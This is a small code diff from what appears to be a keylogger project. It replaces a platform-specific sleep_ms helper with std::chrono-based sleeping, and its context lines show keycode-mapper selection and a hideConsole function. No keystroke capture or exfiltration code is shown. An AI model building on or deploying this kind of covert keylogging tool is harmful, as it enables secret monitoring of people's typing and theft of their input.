@@ -16,6 +16,7 @@
 
 #include "getopt.h"
 
+#include <chrono>
 #include <iostream>
 #include <thread>
 
@@ -36,13 +37,8 @@ Keylogger::IKeycodeMapper* getMapperByStr(std::string mapper) {
     return nullptr;
 }
 
-unsigned int sleep_ms(unsigned int ms) {
-#ifdef _WIN32
-    Sleep(ms);
-    return 0;
-#else
-    return sleep(ms);
-#endif
+void sleep_ms(unsigned int ms) {
+    std::this_thread::sleep_for(std::chrono::milliseconds(ms));
 }
 
 void hideConsole() {
